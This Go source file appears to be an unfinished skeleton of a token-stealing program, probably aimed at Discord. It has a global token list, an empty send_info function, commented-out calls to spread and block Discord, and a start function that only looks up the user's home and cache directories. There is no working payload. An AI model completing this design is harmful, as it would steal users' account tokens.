package main

import (
	"container/list"
	"os"
)

var tokens []string

func main() {
	start()
	send_info()
	// go spred()
	// go block_dc()

}

func send_info() {

}

func start() {
	appdata, _ := os.UserHomeDir()
	localappdata, _ := os.UserCacheDir()
	locations := list.New()

}
